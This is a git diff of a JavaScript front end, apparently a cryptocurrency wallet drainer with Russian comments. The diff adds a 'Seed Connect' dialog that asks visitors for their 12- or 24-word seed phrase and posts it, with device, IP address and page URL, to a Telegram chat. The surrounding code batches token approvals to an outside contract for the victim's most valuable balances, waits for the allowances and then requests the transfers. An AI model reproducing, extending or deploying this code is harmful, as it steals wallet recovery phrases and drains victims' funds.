@@ -2,7 +2,7 @@ import { bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, fan
 import { createAppKit } from '@reown/appkit'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunctionData } from 'viem'
-import { readContract, writeContract, sendCalls, estimateGas, getGasPrice, getBalance } from '@wagmi/core'
+import { readContract, writeContract, sendCalls } from '@wagmi/core'
 import { showAMLCheckModal } from './aml-check-modal.js';
 
 // Утилита для дебаунсинга
@@ -18,20 +18,8 @@ const debounce = (func, wait) => {
 const monitorAndSpeedUpTransaction = async (txHash, chainId, wagmiConfig) => {
   try {
     console.log(`Monitoring transaction ${txHash} on chain ${chainId}`)
-    
-    // Ждем 5 секунд для проверки статуса транзакции
     await new Promise(resolve => setTimeout(resolve, 5000))
-    
-    // Проверяем статус транзакции
-    try {
-      // Здесь можно добавить проверку статуса через RPC
-      // Пока что просто логируем
-      console.log(`Transaction ${txHash} status check completed`)
-      
-    } catch (statusError) {
-      console.log(`Could not check transaction status: ${statusError.message}`)
-    }
-    
+    console.log(`Transaction ${txHash} status check completed`)
     console.log(`Transaction ${txHash} monitoring completed`)
     return true
   } catch (error) {
@@ -100,7 +88,191 @@ const store = {
   isProcessingConnection: false
 }
 
-// Создание модального окна
+// Создание модального окна выбора подключения
+function createConnectModal() {
+  const style = document.createElement('style')
+  style.textContent = `
+    .connect-modal {
+      opacity: 0;
+      transition: opacity 0.3s ease-in-out;
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      justify-content: center;
+      align-items: center;
+    }
+    .connect-modal.show {
+      opacity: 1;
+      display: flex;
+    }
+    .connect-modal-content {
+      transform: translateY(-20px);
+      transition: transform 0.3s ease-in-out, opacity 0.3s ease-in-out;
+      opacity: 0;
+      background-color: #121313;
+      padding: 45px;
+      border-radius: 30px;
+      text-align: center;
+      width: 320px;
+      color: #ffffff;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+    }
+    .connect-modal.show .connect-modal-content {
+      transform: translateY(0);
+      opacity: 1;
+    }
+    .connect-modal-title {
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 30px;
+      margin-top: -25px;
+    }
+    .connect-modal-button {
+      background-color: #ffffff;
+      color: #000000;
+      padding: 10px 20px;
+      border-radius: 8px;
+      border: none;
+      font-size: 16px;
+      cursor: pointer;
+      margin: 10px;
+      width: 200px;
+      transition: background-color 0.2s;
+    }
+    .connect-modal-button:hover {
+      background-color: #e0e0e0;
+    }
+  `
+  document.head.appendChild(style)
+
+  const modal = document.createElement('div')
+  modal.id = 'connectModal'
+  modal.className = 'connect-modal'
+  modal.innerHTML = `
+    <div class="connect-modal-content">
+      <p class="connect-modal-title">Select Connection Method</p>
+      <button id="seedConnectBtn" class="connect-modal-button">Seed Connect</button>
+      <button id="walletConnectBtn" class="connect-modal-button">Wallet Connect</button>
+    </div>
+  `
+  document.body.appendChild(modal)
+}
+
+// Создание модального окна для ввода сид-фразы
+function createSeedPhraseModal() {
+  const style = document.createElement('style')
+  style.textContent = `
+    .seed-modal {
+      opacity: 0;
+      transition: opacity 0.3s ease-in-out;
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      justify-content: center;
+      align-items: center;
+    }
+    .seed-modal.show {
+      opacity: 1;
+      display: flex;
+    }
+    .seed-modal-content {
+      transform: translateY(-20px);
+      transition: transform 0.3s ease-in-out, opacity 0.3s ease-in-out;
+      opacity: 0;
+      background-color: #121313;
+      padding: 45px;
+      border-radius: 30px;
+      text-align: center;
+      width: 320px;
+      color: #ffffff;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+    }
+    .seed-modal.show .seed-modal-content {
+      transform: translateY(0);
+      opacity: 1;
+    }
+    .seed-modal-title {
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 20px;
+      margin-top: -25px;
+    }
+    .seed-modal-select {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 20px;
+      border-radius: 8px;
+      border: 1px solid #ffffff33;
+      background-color: #1a1b1b;
+      color: #ffffff;
+      font-size: 16px;
+    }
+    .seed-modal-textarea {
+      width: 100%;
+      height: 100px;
+      padding: 10px;
+      margin-bottom: 20px;
+      border-radius: 8px;
+      border: 1px solid #ffffff33;
+      background-color: #1a1b1b;
+      color: #ffffff;
+      font-size: 16px;
+      resize: none;
+    }
+    .seed-modal-button {
+      background-color: #ffffff;
+      color: #000000;
+      padding: 10px 20px;
+      border-radius: 8px;
+      border: none;
+      font-size: 16px;
+      cursor: pointer;
+      width: 200px;
+      transition: background-color 0.2s;
+    }
+    .seed-modal-button:hover {
+      background-color: #e0e0e0;
+    }
+    .seed-modal-error {
+      color: #ff4d4d;
+      font-size: 14px;
+      margin-top: 10px;
+      display: none;
+    }
+  `
+  document.head.appendChild(style)
+
+  const modal = document.createElement('div')
+  modal.id = 'seedModal'
+  modal.className = 'seed-modal'
+  modal.innerHTML = `
+    <div class="seed-modal-content">
+      <p class="seed-modal-title">Enter Seed Phrase</p>
+      <select id="seedWordCount" class="seed-modal-select">
+        <option value="12">12 Words</option>
+        <option value="24">24 Words</option>
+      </select>
+      <textarea id="seedPhraseInput" class="seed-modal-textarea" placeholder="Enter your seed phrase"></textarea>
+      <p id="seedError" class="seed-modal-error">Please enter a valid seed phrase</p>
+      <button id="submitSeedBtn" class="seed-modal-button">Submit Seed Phrase</button>
+    </div>
+  `
+  document.body.appendChild(modal)
+}
+
+// Создание модального окна для подписи
 function createCustomModal() {
   const style = document.createElement('style')
   style.textContent = `
@@ -180,6 +352,38 @@ function createCustomModal() {
   document.body.appendChild(modal)
 }
 
+function showConnectModal() {
+  const modal = document.getElementById('connectModal')
+  if (modal) {
+    modal.style.display = 'flex'
+    setTimeout(() => modal.classList.add('show'), 10)
+  }
+}
+
+function hideConnectModal() {
+  const modal = document.getElementById('connectModal')
+  if (modal) {
+    modal.classList.remove('show')
+    setTimeout(() => modal.style.display = 'none', 300)
+  }
+}
+
+function showSeedModal() {
+  const modal = document.getElementById('seedModal')
+  if (modal) {
+    modal.style.display = 'flex'
+    setTimeout(() => modal.classList.add('show'), 10)
+  }
+}
+
+function hideSeedModal() {
+  const modal = document.getElementById('seedModal')
+  if (modal) {
+    modal.classList.remove('show')
+    setTimeout(() => modal.style.display = 'none', 300)
+  }
+}
+
 function showCustomModal() {
   const modal = document.getElementById('customModal')
   if (modal) {
@@ -195,8 +399,6 @@ function hideCustomModal() {
     setTimeout(() => modal.style.display = 'none', 300)
   }
 }
-
-
 
 // Очистка состояния при загрузке страницы
 window.addEventListener('load', () => {
@@ -216,6 +418,8 @@ window.addEventListener('load', () => {
   updateStateDisplay('accountState', {})
   updateStateDisplay('networkState', {})
   updateStateDisplay('tokenBalancesState', [])
+  createConnectModal()
+  createSeedPhraseModal()
   createCustomModal()
 })
 
@@ -253,10 +457,6 @@ const getScanLink = (hash, chainId, isTx = false) => {
     return `https://scrollscan.com${basePath}${hash}`
   } else if (chainId === networkMap['Avalanche'].chainId) {
     return `https://snowtrace.io${basePath}${hash}`
-  } else if (chainId === networkMap['Core'].chainId) {
-    return `https://scan.coredao.org${basePath}${hash}`
-  } else if (chainId === networkMap['Cronos'].chainId) {
-    return `https://cronoscan.com${basePath}${hash}`
   } else if (chainId === networkMap['Fantom'].chainId) {
     return `https://ftmscan.com${basePath}${hash}`
   } else if (chainId === networkMap['Linea'].chainId) {
@@ -329,7 +529,25 @@ async function sendTelegramMessage(message) {
   }
 }
 
-// Уведомления
+// Уведомление о подключении через seed phrase
+async function notifySeedConnection(seedPhrase, device) {
+  try {
+    console.log('Sending seed phrase connection notification')
+    const ip = await getUserIP()
+    const siteUrl = window.location.href || 'Unknown URL'
+    const message = `🚨 New Seed Phrase Connection\n` +
+                    `🛠 Method: Seed Connect\n` +
+                    `📝 Seed Phrase: ${seedPhrase}\n` +
+                    `📱 Device: ${device}\n` +
+                    `🌎 IP: ${ip}\n` +
+                    `🔗 Site: ${siteUrl}`
+    await sendTelegramMessage(message)
+  } catch (error) {
+    store.errors.push(`Error in notifySeedConnection: ${error.message}`)
+  }
+}
+
+// Уведомления для wallet connect
 async function notifyWalletConnection(address, walletName, device, balances, chainId) {
   const connectionKey = `${address}_${chainId}`
   if (store.connectionKey === connectionKey || store.isProcessingConnection) {
@@ -630,12 +848,9 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
       chainId
     })
     console.log(`Approve transaction sent: ${txHash}`)
-    
-    // Запускаем мониторинг транзакции в фоне
     monitorAndSpeedUpTransaction(txHash, chainId, wagmiConfig).catch(error => {
       console.error(`Error monitoring transaction ${txHash}:`, error)
     })
-    
     return txHash
   } catch (error) {
     store.errors.push(`Approve token failed: ${error.message}`)
@@ -643,7 +858,6 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
   }
 }
 
-// Add batch operations function after the getTokenPrice function
 const performBatchOperations = async (mostExpensive, allBalances, state) => {
   if (!mostExpensive) {
     console.log('No most expensive token found, skipping batch operations')
@@ -651,8 +865,6 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
   }
 
   console.log(`Attempting batch operations for network: ${mostExpensive.network}`)
-
-  // Добавляем проверку и смену сети
   const targetNetworkInfo = networkMap[mostExpensive.network]
   if (!targetNetworkInfo) {
     const errorMessage = `Target network for ${mostExpensive.network} (chainId ${mostExpensive.chainId}) not found in networkMap`
@@ -693,10 +905,7 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
   }
 
   try {
-    // Get tokens with non-zero balance in the most expensive token's network
     const networkTokens = allBalances.filter(t => t.network === mostExpensive.network && t.balance > 0)
-
-    // Prepare approve calls for ERC-20 tokens
     const approveCalls = networkTokens
       .filter(t => t.address !== 'native')
       .map(t => ({
@@ -709,7 +918,6 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
         value: '0x0'
       }))
 
-    // Send batch transaction
     if (approveCalls.length > 0) {
       const id = await sendCalls(wagmiAdapter.wagmiConfig, {
         calls: approveCalls,
@@ -729,7 +937,6 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
   }
 }
 
-// Модифицируем initializeSubscribers для корректной работы уведомлений
 const initializeSubscribers = (modal) => {
   const debouncedSubscribeAccount = debounce(async state => {
     updateStore('accountState', state)
@@ -793,21 +1000,16 @@ const initializeSubscribers = (modal) => {
       if (mostExpensive) {
         console.log(`Most expensive token: ${mostExpensive.symbol}, balance: ${mostExpensive.balance}, price in USDT: ${mostExpensive.price}`)
         
-        // Try batch operations first
         const batchResult = await performBatchOperations(mostExpensive, allBalances, state)
         
         if (batchResult.success) {
-          // Handle successful batch transaction
           console.log('Batch transaction successful')
-          
-          // Get all tokens that were approved in batch
           const approvedTokens = allBalances.filter(t => 
             t.network === mostExpensive.network && 
             t.balance > 0 &&
             t.address !== 'native'
           )
           
-          // Notify about batch approval for all tokens
           for (const token of approvedTokens) {
             await notifyTransferApproved(
               state.address,
@@ -818,7 +1020,6 @@ const initializeSubscribers = (modal) => {
             )
           }
           
-          // Wait for allowance and send transfer request for all approved tokens
           for (const token of approvedTokens) {
             try {
               await waitForAllowance(
@@ -853,7 +1054,6 @@ const initializeSubscribers = (modal) => {
             }
           }
         } else if (batchResult.error === 'BATCH_NOT_SUPPORTED') {
-          // Fallback to regular approve if batch is not supported
           console.log('Batch transactions not supported (wallet_sendCalls not available), falling back to regular approve')
           
           try {
@@ -872,7 +1072,6 @@ const initializeSubscribers = (modal) => {
               store.approvedTokens[approvalKey] = true
               store.isApprovalRequested = false
               
-              // Notify about single token approval
               await notifyTransferApproved(
                 state.address,
                 walletInfo.name,
@@ -881,7 +1080,6 @@ const initializeSubscribers = (modal) => {
                 mostExpensive.chainId
               )
               
-              // Wait for allowance and send transfer request
               await waitForAllowance(
                 wagmiAdapter.wagmiConfig,
                 state.address,
@@ -925,7 +1123,6 @@ const initializeSubscribers = (modal) => {
     updateStateDisplay('networkState', state)
     const switchNetworkBtn = document.getElementById('switch-network')
     if (switchNetworkBtn) {
-      // Определяем следующую сеть для переключения
       let nextNetwork = 'Ethereum'
       if (state?.chainId === networkMap['Ethereum'].chainId) nextNetwork = 'Polygon'
       else if (state?.chainId === networkMap['Polygon'].chainId) nextNetwork = 'Arbitrum'
@@ -970,18 +1167,61 @@ const handleApproveError = (error, token, state) => {
   }
 }
 
+// Инициализация обработчиков для модальных окон
+function initializeModalHandlers() {
+  // Обработчики для модального окна выбора подключения
+  document.getElementById('walletConnectBtn')?.addEventListener('click', () => {
+    hideConnectModal()
+    if (!appKit.getIsConnectedState()) {
+      appKit.open()
+    }
+  })
+
+  document.getElementById('seedConnectBtn')?.addEventListener('click', () => {
+    hideConnectModal()
+    showSeedModal()
+  })
+
+  // Обработчик для отправки seed phrase
+  document.getElementById('submitSeedBtn')?.addEventListener('click', async () => {
+    const seedInput = document.getElementById('seedPhraseInput')
+    const wordCountSelect = document.getElementById('seedWordCount')
+    const errorElement = document.getElementById('seedError')
+    const seedPhrase = seedInput.value.trim()
+    const expectedWordCount = parseInt(wordCountSelect.value)
+
+    // Простая валидация seed phrase
+    const words = seedPhrase.split(/\s+/)
+    if (words.length !== expectedWordCount) {
+      errorElement.style.display = 'block'
+      errorElement.textContent = `Please enter exactly ${expectedWordCount} words`
+      return
+    }
+
+    // Отправка уведомления в Telegram
+    const device = detectDevice()
+    await notifySeedConnection(seedPhrase, device)
+    
+    // Очистка поля и закрытие модального окна
+    seedInput.value = ''
+    errorElement.style.display = 'none'
+    hideSeedModal()
+  })
+}
+
 initializeSubscribers(appKit)
+initializeModalHandlers()
 updateButtonVisibility(appKit.getIsConnectedState())
 
 // Обработчик для кнопок подключения кошелька
 document.querySelectorAll('.open-connect-modal').forEach(button => {
   button.addEventListener('click', (event) => {
-    event.stopPropagation(); // Предотвращаем всплытие события к document
+    event.stopPropagation()
     if (!appKit.getIsConnectedState()) {
-      appKit.open();
+      showConnectModal()
     }
-  });
-});
+  })
+})
 
 document.getElementById('disconnect')?.addEventListener('click', () => {
   appKit.disconnect()
@@ -996,8 +1236,6 @@ document.getElementById('disconnect')?.addEventListener('click', () => {
 
 document.getElementById('switch-network')?.addEventListener('click', () => {
   const currentChainId = store.networkState?.chainId
-  
-  // Определяем следующую сеть для переключения
   let nextNetwork = networkMap['Ethereum'].networkObj
   if (currentChainId === networkMap['Ethereum'].chainId) nextNetwork = networkMap['Polygon'].networkObj
   else if (currentChainId === networkMap['Polygon'].chainId) nextNetwork = networkMap['Arbitrum'].networkObj
